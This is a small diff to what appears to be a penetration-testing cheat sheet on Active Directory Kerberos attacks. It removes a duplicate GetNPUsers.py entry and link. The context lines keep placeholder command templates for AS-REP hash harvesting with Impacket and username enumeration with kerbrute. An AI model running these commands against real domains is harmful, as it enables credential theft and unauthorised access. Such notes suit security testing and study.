@@ -25,8 +25,6 @@
   * &#x20;`GetNPUsers.py <domain>/ -dc-ip <ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`&#x20;
 * [Kerbrute](https://github.com/ropnop/kerbrute)
   * `kerbrute userenum --dc <IP> -d <domain> wordlist.txt`
-* [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
-  * `GetNPUsers.py <domain>/ -dc-ip <IP> -no-pass -usersfile valid_ad_users`
 
 ### Force Disable Kerberos Preauth
 
@@ -58,4 +56,3 @@
 ### Tools
 
 * [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\))
-* [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
